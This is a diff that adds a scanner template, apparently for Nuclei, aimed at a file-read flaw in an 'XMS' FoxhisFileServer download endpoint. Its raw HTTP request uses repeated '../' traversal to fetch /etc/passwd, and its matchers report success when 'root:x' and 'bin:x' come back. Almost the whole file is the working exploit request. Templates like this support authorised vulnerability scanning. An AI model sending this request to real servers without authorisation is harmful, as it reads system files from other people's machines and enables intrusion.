@@ -1,0 +1,25 @@
+id: XMS-download2-ReadAnyFile
+info:
+  name: XMS-download2-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    XMS-download2-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /FoxhisFileServer/action?method=download2&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bin:x"
+          - "root:x"
+        condition: and
